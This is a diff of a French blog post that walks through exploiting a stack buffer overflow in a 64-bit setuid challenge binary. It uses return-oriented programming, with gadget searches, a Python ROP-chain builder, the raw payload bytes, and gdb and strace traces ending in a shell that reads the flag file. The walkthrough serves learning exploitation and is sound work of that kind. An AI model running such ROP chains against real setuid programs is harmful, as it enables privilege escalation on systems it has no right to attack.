@@ -11,7 +11,7 @@ topics = []
 ## Introduction
 
 
-Bon ben dans la même veine que le post précedent, je vais tâcher d'expliquer comment exploiter un buffer overflow sur la pile, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilise quand la pile n'est pas exécutable, l'idée étant de sauter dans une portion de code qui l'est, et petit à petit, reconstruire un flot d'exécution qui mène à... obtenir un shell avec des droits plus importants, dans le cas présent.
+Bon ben dans la même veine que le post précedent, je vais tâcher d'expliquer comment exploiter un buffer overflow sur la pile, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilisée quand la pile n'est pas exécutable, l'idée étant de sauter dans une portion de code qui l'est, et petit à petit, reconstruire un flot d'exécution qui mène à... obtenir un shell avec des droits plus importants, dans le cas présent.  
 
 	$ ll
 	total 876
@@ -22,9 +22,9 @@ Bon ben dans la même veine que le post précedent, je vais tâcher d'expliquer 
 	-r--------  1 user-cracked  user-cracked     23 juin   7  2015 .passwd
 	$
 
-Comme auparavant, on a un binaire setuid user-cracked, et il nous faut lire le fichier `.passwd`.
+Comme auparavant, on a un binaire setuid user-cracked, et il nous faut lire le fichier `.passwd`.  
 
-Bon, essayons d'avoir quelques informations pertinentes...
+Bon, essayons d'avoir quelques informations pertinentes...  
 
 	$ checksec.sh --file ./prog
 	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
@@ -60,20 +60,20 @@ Bon, essayons d'avoir quelques informations pertinentes...
 		return 0;
 	}
 
-Bon, il y a un buffer overflow évident à cause de `gets()`.  Tout le monde sait qu'il ne faut pas utiliser cette fonction, pas la peine d'épiloguer.
+Bon, il y a un buffer overflow évident à cause de `gets()`.  Tout le monde sait qu'il ne faut pas utiliser cette fonction, pas la peine d'épiloguer.  
 
 
-Ici, il y a deux choses a avoir en tete:
+Ici, il y a deux choses à avoir en tete:  
 
-- la pile est non-executable
+- la pile est non-exécutable
 
-Ce qui fait qu'on ne pourra pas pousser un shellcode directement dans la pile, via un buffer à exploiter ou une variable d'environnement.  Il faudra faire du ret2libc, ou du ROP.
+Ce qui fait qu'on ne pourra pas pousser un shellcode directement dans la pile, via un buffer à exploiter ou une variable d'environnement.  Il faudra faire du ret2libc, ou du ROP.  
 
 - le programme tourne en 64 bits
 
-Les conventions d'appel de fonction ne sont pas les mêmes qu'en 32 bits, les syscalls ont de petites différences, etc.  On verra ca dans la suite...  Il faut également garder à l'esprit que l'espace des adresses valide n'est pas le même qu'en 32 bits.  En effet souvent on utilise la fameuse séquence `0x414141..`. pour marquer qu'on contrôle bien le pointer `$eip`.  En 32 bits, cette adresse est valide puisque l'espace adressable va de `0X0..0` à `0xbfffffff`.  Par contre en 64 bits, on va de `0x00...0` à `0x0000b7ffffffffff`.  Donc `0x4141...` va directement taper dans les adresses interdites.  Si on forge une adresse bidon, il faut mettre les deux premiers bytes (au moins) à zéro.
+Les conventions d'appel de fonction ne sont pas les mêmes qu'en 32 bits, les syscalls ont de petites différences, etc.  On verra ca dans la suite...  Il faut également garder à l'esprit que l'espace des adresses valide n'est pas le même qu'en 32 bits.  En effet souvent on utilise la fameuse séquence `0x414141..`. pour marquer qu'on contrôle bien le pointer `$eip`.  En 32 bits, cette adresse est valide puisque l'espace adressable va de `0X0..0` à `0xbfffffff`.  Par contre en 64 bits, on va de `0x00...0` à `0x0000b7ffffffffff`.  Donc `0x4141...` va directement taper dans les adresses interdites.  Si on forge une adresse bidon, il faut mettre les deux premiers bytes (au moins) à zéro.  
 
-Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell...
+Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell...  
 
 	$ nm -a ./prog | egrep '(system|exec)'
 	0000000000468420 T _dl_make_stack_executable
@@ -83,37 +83,37 @@ Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell..
 	00000000004aa1c0 r system_dirs
 	00000000004aa1a0 r system_dirs_len
 	$
-
-Oookay, rien d'intéressant.   Vraiment?
-
+  
+Oookay, rien d'intéressant...   Vraiment?  
+  
 
 ## Tentative de ret2libc
+  
 
 
-
-Il y a peut-être moyen de rendre la stack exécutable grâce à `mprotect()` (`_dl_make_stack_executable` nous y a fait fortement penser), puis de sauter à l'adresse d'un shellcode qu'on aurait mis dans le buffer du programme, ou dans une variable d'environnement.
+Il y a peut-être moyen de rendre la stack exécutable grâce à `mprotect()` (`_dl_make_stack_executable` nous y a fait fortement penser), puis de sauter à l'adresse d'un shellcode qu'on aurait mis dans le buffer du programme, ou dans une variable d'environnement.  
 
 	$ nm prog| grep mprotect
 	0000000000434e10 W mprotect
 	0000000000434e10 T __mprotect
 	$
-
-Ca semble jouable? Le man de `mprotect(2)` nous dit qu'il faut PROT_EXEC pour rendre une portion de code exécutable (`0x4` d'après les headers du système).  Dans le doute, si on peut faire appel à cette fonction, autant filer tous les flags de l'univers: `PROT_EXEC|PROT_WRITE|PROT_READ` = `0x7`.  Le prototype de la fonction est le suivant :
-
+  
+Ca semble jouable? Le man de `mprotect(2)` nous dit qu'il faut PROT_EXEC pour rendre une portion de code exécutable (`0x4` d'après les headers du système).  Dans le doute, si on peut faire appel à cette fonction, autant filer tous les flags de l'univers: `PROT_EXEC|PROT_WRITE|PROT_READ` = `0x7`.  Le prototype de la fonction est le suivant :  
+  
        int mprotect(void *addr, size_t len, int prot);
-
-Il faudra donc mettre dans l'ordre, sur la stack:
-
+  
+Il faudra donc mettre dans l'ordre, sur la stack:  
+  
 	[ 0x7 | stacksize | $esp | @__mprotect | return addr ]
-
-Euh... en fait non.  En réalité sur 64 bits, le passage de paramètres d'une fonction se fait via les registres, pas en ajoutant sur la pile.  Donc l'appel sera de la forme :
-
+  
+Euh... en fait non.  En réalité sur 64 bits, le passage de paramètres d'une fonction se fait via les registres, pas en ajoutant sur la pile.  Donc l'appel sera de la forme :  
+  
 	[ @__mprotect | return addr ]
-
-Les params sont ensuite passés via les registres `$rdi`, `$rsi`, `$rdx`, `$rcx`, `$r8`, et `$r9`.  Si vraiment il faut encore passer plus de paramètres à la fonction, alors c'est mis sur la stack (mais ça reste rare).  Mais on ne devrait pas aller jusque la, puisque `mprotect()` ne prend que 3 arguments.
-
-Une fois la stack rendue exécutable, il suffira d'avoir empiler l'adresse de notre shellcode (`return addr` dans le petit schéma) pour sauter où on souhaite.
-
+  
+Les paramètres sont ensuite passés via les registres `$rdi`, `$rsi`, `$rdx`, `$rcx`, `$r8`, et `$r9`.  Si vraiment il faut encore passer plus de paramètres à la fonction, alors c'est mis sur la stack (mais ça reste rare).  Mais on ne devrait pas aller jusque là, puisque `mprotect()` ne prend que 3 arguments.  
+  
+Une fois la stack rendue exécutable, il suffira d'avoir empilé l'adresse de notre shellcode (`return addr` dans le petit schéma) pour sauter où on souhaite.  
+  
 
 	gdb$ ./prog
 	[...]
@@ -123,15 +123,15 @@ Une fois la stack rendue exécutable, il suffira d'avoir empiler l'adresse de no
 	   0x000000000040105f <+1>:     mov    rbp,rsp
 	   0x0000000000401062 <+4>:     sub    rsp,0x120
 	   [...]
-
-On voit que le système réserve `0x120` (288) bytes dans la pile pour faire de la place aux variables locales, etc.
-
+  
+On voit que le système réserve `0x120` (288) bytes dans la pile pour faire de la place aux variables locales, etc.  
+  
 	   0x0000000000401076 <+24>:    lea    rax,[rbp-0x110]
 	   0x000000000040107d <+31>:    mov    rdi,rax
 	   0x0000000000401080 <+34>:    call   0x408750 <gets>
-
-A l'aide de ces trois instruction, on déduit que le registre rax contient l'adresse du buffer qui sera passé à la fonction `gets()`.  Et que sa base est à `0x110` (272) bytes du début de la pile (`$rbp`).  On en déduit donc que si on écrit 272 bytes dans `buffer`, alors on arrivera pile a la limite de `$rbp` qui a été empilé.  Les 8 prochains bytes vont écraser $rbp, et les 8 suivant écraseront `$rip`.  C'est ce registre qu'on veut contrôler.  On va tester (par acquis de conscience on met une adresse valide dans `$rbp`, i.e. `0x0000424242424242`, et `0x0000434343434343` dans `$rip`:
-
+  
+A l'aide de ces trois instruction, on déduit que le registre `$rax` contient l'adresse du buffer qui sera passé à la fonction `gets()`.  Et que sa base est à `0x110` (272) bytes du début de la pile (`$rbp`).  On en déduit donc que si on écrit 272 bytes dans `buffer`, alors on arrivera pile a la limite de `$rbp` qui a été empilé.  Les 8 prochains bytes vont écraser $rbp, et les 8 suivant écraseront `$rip`.  C'est ce registre qu'on veut contrôler.  On va tester (par acquis de conscience on met une adresse valide dans `$rbp`, i.e. `0x0000424242424242`, et `0x0000434343434343` dans `$rip`:  
+  
 	gdb$ r < <(perl -e 'print "A"x272 . "B"x6 . "\x00\x00" . "C"x6 . "\x00\x00"')
 	----------------------------------------------------------------------------------------------------------------------[regs]
 	 RAX: 0x0000000000000000  RBX: 0x00000000004002B0  RBP: 0x0000424242424242  RSP: 0x000003D42322B720  o d I t s Z a P c
@@ -141,9 +141,9 @@ A l'aide de ces trois instruction, on déduit que le registre rax contient l'adr
 	 CS: 0033  DS: 0000  ES: 0000  FS: 0063  GS: 0000  SS: 002B                            Error while running hook_stop:
 	Cannot access memory at address 0x434343434343
 	0x0000434343434343 in ?? ()
-
-Youpi les knackis!  Donc on a réussi à écrire dans `$rip`. On met l'adresse de `mprotect()` dans `$rip`, on met un breakpoint sur l'instruction `ret`.
-
+  
+Youpi les knackis!  Donc on a réussi à écrire dans `$rip`. On met l'adresse de `mprotect()` dans `$rip`, on met un breakpoint sur l'instruction `ret`.  
+  
 	   [...]
 	   0x00000000004010e6 <+136>:   mov    eax,0x0
 	   0x00000000004010eb <+141>:   leave
@@ -170,38 +170,38 @@ Youpi les knackis!  Donc on a réussi à écrire dans `$rip`. On met l'adresse d
 	-----------------------------------------------------------------------------------------------------------------------------
 	0x0000000000434e10 in mprotect ()
 
-
-	Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Ca a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.
-
+  
+Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Ca a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.  
+  
 
 ## Bon... ben ROP.
+  
 
-
-L'objectif est de trouver des séquences d'instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d'opérations qui feront quelque chose de particulier.  En l'occurrence, obtenir un shell avec les droits privilégiés.
-
-Récuperons un outil pour trouver des gadgets (c'est ainsi qu'on appelle ces séquences d'instructions).  Comme on n'a pas les droits en écriture dans le répertoire `$HOME`, on va tout mettre en bordel dans `/tmp`.
-
+L'objectif est de trouver des séquences d'instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d'opérations qui feront quelque chose de particulier.  En l'occurrence, obtenir un shell avec les droits privilégiés.  
+  
+Récuperons un outil pour trouver des gadgets (c'est ainsi qu'on appelle ces séquences d'instructions).  Comme on n'a pas les droits en écriture dans le répertoire `$HOME`, on va tout mettre en bordel dans `/tmp`.  
+  
 	$ mkdir /tmp/p
 	$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
 	$ chmod +x /tmp/p/rp-lin-x64
 	$ export PATH=$PATH:/tmp/p
-
-On va tenter de faire exécuter un `execve()` via des gadgets, du coup.  Ce qu'on souhaite, c'est faire executer `execve("/bin/sh", NULL, NULL);`.  Notons que d'après la documentation de l'ABI du système, `$rax` doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit... dans notre cas on s'en moque, puisqu'on veut spawner un shell).  Il faudra donc mettre les registres dans l'état suivant:
-
+  
+On va tenter de faire exécuter un `execve()` via des gadgets, du coup.  Ce qu'on souhaite, c'est faire executer `execve("/bin/sh", NULL, NULL);`.  Notons que d'après la documentation de l'ABI du système, `$rax` doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit... dans notre cas on s'en moque, puisqu'on veut spawner un shell).  Il faudra donc mettre les registres dans l'état suivant:  
+  
 	 RAX <- 59 (la valeur du syscall execve() sur 64bits, avant int 0x80)
 	 RDI <- "/bin/sh" ou quelque chose du genre
 	 RSX <- 0 (NULL)
 	 RDX <- 0 (NULL)
-
-Donc, le layout de la pile devrait ressembler à quelque chose comme ceci:
-
+  
+Donc, le layout de la pile devrait ressembler à quelque chose comme ceci:  
+  
 	[AAA....A] [BBBBBB00] [pop rax] [valeur à mettre dans rax] [pop rdi] [valeur à mettre dans rdi]... [appel à execve()]
 	^	   ^          ^
 	|	   |          |
 	buffer	   $rbp       $rip
-
-On va utiliser l'outil téléchargé (il y en a d'autres, comme `ROPgadget`), pour avoir les adresses des instructions intéressantes:
-
+  
+On va utiliser l'outil téléchargé (il y en a d'autres, comme `ROPgadget`), pour avoir les adresses des instructions intéressantes:  
+  
 	$ rp-lin-x64 --file ./prog --unique -r 1 | grep "pop rax"
 	[...]
 	0x0044d2b4: pop rax ; ret  ;  (8 found)
@@ -217,36 +217,36 @@ On va utiliser l'outil téléchargé (il y en a d'autres, comme `ROPgadget`), po
 	$ rp-lin-x64 -f prog --unique  -r 1 | egrep "pop rdx"
 	[...]
 	0x00437205: pop rdx ; ret  ;  (2 found)
-
-Et pour finir, on cherche l'appel à un syscall.  Notons encore une fois une difference entre x86 et x86-64: l'appel est `int 0x80` sur 32 bits, alors qu'on utilise `syscall` sur x86-64 (depend si on est sur intel ou amd)
+  
+Et pour finir, on cherche l'appel à un syscall.  Notons encore une fois une difference entre x86 et x86-64: l'appel est `int 0x80` sur 32 bits, alors qu'on utilise `syscall` sur x86-64 (depend si on est sur intel ou amd)  
 
 	$ rp-lin-x64 -f prog --unique -r 1 | grep syscall
 	[...]
 	0x00400488: syscall  ;  (95 found)
+  
+Bien, on a l'adresse a empiler en dernier!  
+  
 
-Bien, on a l'adresse a empiler en dernier!
-
-
-Maintenant, si vous avez fait attention, vous avez remarqué qu'on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().  On ne trouve pas "/bin/sh" dans l'image du programme en mémoire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à `/bin/dash` qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire `/tmp/p`, qu'on ajoutera au `PATH`.
-
+Maintenant, si vous avez fait attention, vous avez remarqué qu'on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().  On ne trouve pas "/bin/sh" dans l'image du programme en mémoire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à `/bin/dash` qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire `/tmp/p`, qu'on ajoutera au `PATH`.  
+  
 	$ readelf -x .rodata ./prog | less
 	[...]
 	  0x00493c00 42654000 00000000 68654000 00000000 Be@.....he@.....
 	[...]
-
-On trouve la séquence `42654000`, qui correspond à `"Be@"` terminée par un nul-byte.  Son adresse est `0x00493c00`, et on l'utilisera dans `$rdi`.  Ensuite, on crée un petit shell script dans `/tmp/p`:
-
+  
+On trouve la séquence `42654000`, qui correspond à `"Be@"` terminée par un nul-byte.  Son adresse est `0x00493c00`, et on l'utilisera dans `$rdi`.  Ensuite, on crée un petit shell script dans `/tmp/p`:  
+  
 	$ cat > /tmp/p/Be@
 	#!/bin/dash
-
+  
 	/bin/dash
 	$ chmod +x /tmp/p/Be@
+  
+Ainsi, si `execve()` invoque la commande `Be@`, elle sera dans notre `PATH`, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d'un path type `/bin/sh` via des gadgets.  
+  
 
-Ainsi, si `execve()` invoque la commande `Be@`, elle sera dans notre `PATH`, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d'un path type `/bin/sh` via des gadgets.
-
-
-Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l'endianness:
-
+Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l'endianness:  
+  
 	$ cat > /tmp/p/ropchain.py
 	#!/usr/bin/env python3
 
@@ -280,9 +280,9 @@ Boooon, que les choses sérieuses commencent!  On va construire notre ropchain m
 
 	$ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
         AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00<I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00'\xe9J\x00\x00\x00\x00\x00
-
-NOTE:  le `${sc:2:-1}` permet de se débarrasser du `b"` en début de chaîne et `"` en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j'avais pas de temps à perdre là-dessus!
-
+  
+NOTE:  le `${sc:2:-1}` permet de se débarrasser du `b"` en début de chaîne et `"` en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j'avais pas de temps à perdre là-dessus!  
+  
 
 	$ gdb ./prog
 	[...]
@@ -303,9 +303,9 @@ NOTE:  le `${sc:2:-1}` permet de se débarrasser du `b"` en début de chaîne et
 	   0x4010ed:    nop    DWORD PTR [rax]
 	[...]
 	Breakpoint 1, 0x00000000004010ec in main ()
-
-On regarde l'état de la stack, et on observe qu'on a correctement empilé les adresses de nos petits gadgets:
-
+  
+On regarde l'état de la stack, et on observe qu'on a correctement empilé les adresses de nos petits gadgets:  
+  
 	gdb$ x/20gx $rsp - 30
 	0x3ac2bce0758:  0x4141414141414141      0x4141414141414141
 	0x3ac2bce0768:  0x4141414141414141      0x4141414141414141
@@ -343,9 +343,9 @@ On regarde l'état de la stack, et on observe qu'on a correctement empilé les a
 	gdb$ x/i 0x0000000000400488
 	   0x400488 <backtrace_and_maps+183>:   syscall
 
-
-Vérifions que la chaîne est celle attendue:
-
+  
+Vérifions que la chaîne est celle attendue:  
+  
 	gdb$ x/s 0x0000000000493c00
 	0x493c00:       "Be@"
 	gdb$ c
@@ -353,9 +353,9 @@ Vérifions que la chaîne est celle attendue:
 
 	Program received signal SIGSEGV, Segmentation fault.
 
-
-Bizarre, si j'execute instruction par instruction on voit que tout se passe comme espère, mais on n'a pas de shell, et le programme explose.  D'ailleurs pour confirmer, on peut utiliser `strace(1)`:
-
+  
+Bizarre, si j'execute instruction par instruction on voit que tout se passe comme espère, mais on n'a pas de shell, et le programme explose.  D'ailleurs pour confirmer, on peut utiliser `strace(1)`:  
+  
 	$ (perl -e 'print "'$sc'"') | strace ./prog
 	execve("./prog", ["./prog"], [/* 19 vars */]) = 0
 	uname({sys="Linux", node="host", ...}) = 0
@@ -377,13 +377,13 @@ Bizarre, si j'execute instruction par instruction on voit que tout se passe comm
 	--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=0} ---
 	+++ killed by SIGSEGV +++
 	Segmentation fault
-
-On remarque la ligne:
-
+  
+On remarque la ligne:  
+  
 	execve("Be@", [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
-
-On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD`.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:
-
+  
+On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD`.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
+  
 	$ cd /tmp/p && (perl -e 'print "'$sc'"') | strace ~/prog
 	[...]
 	rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
@@ -397,9 +397,9 @@ On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons
 	exit_group(0)                           = ?
 	+++ exited with 0 +++
 	$
-
-Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou une séquence terminant le shell.  On va utiliser le trick du built-in `cat`, pour maintenir le stdin ouvert (et on ajoute un `\n` pour flusher les buffers):
-
+  
+Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou une séquence terminant le shell.  On va utiliser le trick du built-in `cat`, pour maintenir le stdin ouvert (et on ajoute un `\n` pour flusher les buffers):  
+  
 	$ (perl -e 'print "'$sc'" . "\n"'; cat) |  ~/prog
 	Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
 	ls
@@ -414,5 +414,6 @@ Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou u
 	-rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
 	cat .passwd
 	CeciEstMonFlagTagadaTsoinTsoin!
-
+  
 Et voilà!  Youpi!
+  
